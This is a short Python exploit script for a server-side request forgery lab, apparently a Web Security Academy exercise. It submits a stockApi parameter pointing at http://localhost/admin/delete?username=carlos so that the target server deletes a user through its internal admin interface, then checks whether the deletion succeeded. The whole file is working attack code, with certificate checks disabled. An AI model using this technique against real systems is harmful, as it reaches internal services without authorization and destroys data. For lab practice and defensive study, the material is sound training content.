import sys
import urllib.parse
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies = {'http':'http://127.0.0.1:8080' , 'https':'https://127.0.0.1:8080'}
def ssrf_func(url):
    ssrf_payload = 'http://localhost/admin/delete?username=carlos'
    vulnerable_redirect = 'product/stock'
    # ssrf_payload_encoded = urllib.parse.quote(ssrf_payload)
    params = {'stockApi': ssrf_payload}

    r = requests.post(url + vulnerable_redirect , data = params,verify=False)

    checking_payload = 'http://localhost/admin'
    # checking_payload_encoded = urllib.parse.quote(checking_payload)
    params2 = {'stockApi':checking_payload}

    r = requests.post(url + vulnerable_redirect , data = params2 , verify=False)

    if "carlos" in r.text:
        print("[-] exploit failed")
    else:
        print("[+] exploit successful")

def main():
    if len(sys.argv) != 2:
        print("[+]usage: %s <url>"% sys.argv[0])
        sys.exit(-1)

    print("deleting username carlos...")
    url = sys.argv[1]
    ssrf_func(url)

if __name__ == "__main__":
    main()